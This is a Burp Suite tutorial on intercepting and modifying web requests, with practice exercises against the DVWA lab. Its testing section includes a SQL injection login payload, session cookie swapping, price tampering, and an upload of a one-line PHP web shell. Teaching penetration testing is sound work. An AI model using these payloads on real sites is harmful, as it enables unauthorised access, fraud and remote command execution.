# BurpSuite: Intercepting Requests

## Overview

Request interception is one of Burp Suite's core features, allowing you to view, modify, and replay HTTP/HTTPS requests and responses in real-time.

## Setup

### 1. Configure Browser Proxy

**Firefox**:
1. Settings → Network Settings
2. Manual proxy configuration
3. HTTP Proxy: `127.0.0.1`, Port: `8080`
4. Check "Also use this proxy for HTTPS"

**Chrome** (with FoxyProxy extension):
1. Install FoxyProxy
2. Add new proxy: `127.0.0.1:8080`
3. Enable proxy

### 2. Install Burp CA Certificate

1. Visit: `http://burpsuite` (with proxy enabled)
2. Download CA Certificate  
3. Import to browser:
   - Firefox: Preferences → Privacy & Security → Certificates → Import
   - Chrome: Settings → Privacy → Manage certificates → Import

## Using Intercept

### Enable Interception

1. **Proxy tab → Intercept**
2. Click **"Intercept is on"**
3. Browse to target website
4. Requests appear in Burp for modification

### Basic Interception

```http
GET /login HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=abc123

username=admin&password=test123
```

**Actions**:
- **Forward**: Send request to server
- **Drop**: Cancel request
- **Action**: Send to other tools (Repeater, Intruder)

### Modifying Requests

#### Change Parameters
```http
# Original
username=user&password=pass123

# Modified
username=admin&password=admin
```

#### Change HTTP Method
```http
# Original
POST /delete HTTP/1.1

# Modified to
GET /delete HTTP/1.1
```

#### Modify Headers
```http
# Add custom header
X-Forwarded-For: 127.0.0.1

# Change User-Agent
User-Agent: BurpSuite/2.0

# Modify cookies
Cookie: admin=true; role=administrator
```

## Common Testing Scenarios

### 1. Authentication Bypass

**Test weak authentication**:
```http
# Original request
POST /login HTTP/1.1

username=test&password=test

# Modify to test for SQL injection
username=admin' OR '1'='1&password=anything
```

### 2. Session Manipulation

```http
# Change session cookie
Cookie: session=user_token_123

# To admin session
Cookie: session=admin_token_456
```

### 3. Parameter Tampering

```http
# Price modification
POST /checkout HTTP/1.1

item_id=123&price=999.99

# Changed to
item_id=123&price=0.01
```

### 4. Access Control Testing

```http
# Original
GET /user/profile?id=100 HTTP/1.1

# Test IDOR
GET /user/profile?id=1 HTTP/1.1
GET /user/profile?id=2 HTTP/1.1
```

### 5. File Upload Testing

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

## Intercept Filters

### Configure Filters

**Proxy → Options → Intercept Client Requests**:

Intercept if:
- ✅ URL matches: `^/admin/.*`
- ✅ Contains parameters
- ✅ Method is POST
- ❌ File extension is: `js, css, jpg, png`

**Intercept Server Responses**:
- ✅ Status code: `200, 302, 403`
- ✅ MIME type: `HTML`

## Match and Replace

**Automate modifications**:

Proxy → Options → Match and Replace:

```
Type: Request header
Match: User-Agent: .*
Replace: User-Agent: BurpScanner/1.0
```

```
Type: Request body
Match: price=(.*)
Replace: price=0.01
```

## Best Practices

### Scope Configuration

**Target → Scope → Add**:
- Include: `https://target-site.com/*`
- Exclude: `https://analytics.google.com/*`

**Proxy → Options**:
- ✅ "Intercept requests based on scope"

### Hotkeys

- `Ctrl+F`: Forward
- `Ctrl+D`: Drop
- `Ctrl+R`: Send to Repeater
- `Ctrl+I`: Send to Intruder
- `Ctrl+Shift+R`: Send to Repeater (new tab)

### Workflow Tips

1. **Define scope** first
2. **Enable intercept** selectively
3. **Use filters** to reduce noise
4. **Forward non-interesting** requests quickly
5. **Send interesting requests** to Repeater/Intruder

## Integration with Other Tools

### Send to Repeater

- Right-click request → Send to Repeater
- Modify and replay multiple times
- Compare responses

### Send to Intruder

- Right-click request → Send to Intruder
- Mark injection points
- Run automated attacks

### Send to Scanner

- Right-click → Scan
- Automated vulnerability scanning

## Advanced Techniques

### WebSocket Interception

1. Proxy → WebSockets history
2. Intercept WebSocket messages
3. Modify real-time communications

### HTTP/2 Support

- Burp automatically handles HTTP/2
- Can downgrade to HTTP/1.1 for compatibility

### SSL Pass Through

**For specific hosts**:
- Proxy → Options → TLS Pass Through
- Add hostname patterns
- Burp won't intercept SSL for these hosts

## Common Issues

### Certificate Errors
**Solution**: Ensure Burp CA cert is installed

### Slow Browsing
**Solution**: 
- Disable intercept when not needed
- Use scope-based filtering
- Reduce response interception

### Missing Responses
**Solution**: 
- Check "Intercept responses" settings
- Verify response filters

## Practice Exercises

### Exercise 1: Modify Login Request
1. Navigate to DVWA login
2. Intercept request
3. Change username to SQL injection payload
4. Forward and observe

### Exercise 2: Session Hijacking
1. Login as low-privilege user
2. Capture session cookie
3. Modify to different value
4. Test access control

### Exercise 3: Price Manipulation
1. Add item to cart
2. Intercept checkout request
3. Modify price parameter
4. Complete purchase

## Resources

- Burp Suite Documentation
- PortSwigger Web Security Academy
- OWASP Testing Guide
